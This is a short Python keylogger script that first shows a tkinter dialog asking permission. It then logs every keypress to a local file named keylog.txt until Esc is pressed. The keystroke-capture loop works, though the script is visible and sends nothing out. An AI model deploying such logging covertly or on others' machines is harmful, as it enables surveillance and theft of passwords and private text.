import logging
from pynput.keyboard import Key, Listener
from tkinter import *
import tkinter.messagebox

flag = False
root = tkinter.Tk() 

root.title("Take permission!!") 
root.geometry('500x300') 

text = Label(root, text="would you like to use this keylogger?")
text.place(x=20,y=50)

def onClickNo():
    exit(0)

def onClickYes():
    global flag
    flag = True
    tkinter.messagebox.showinfo("Welcome to keylogger","Keylogger is running for exit press esc.") 
    root.destroy()

button = Button(root, text="Yes", command=onClickYes, height=5, width=10)
button2 = Button(root, text="No", command=onClickNo, height=5, width=10) 


button.pack(side=LEFT) 
button2.pack(side=RIGHT)
root.mainloop() 

if flag:
    logging.basicConfig(filename="keylog.txt",filemode="a",level=logging.DEBUG)
    def keypress(key):
            logging.info(str(key))
            if key==Key.esc:
                return False

    with Listener (on_press=keypress) as listener:
            listener.join()
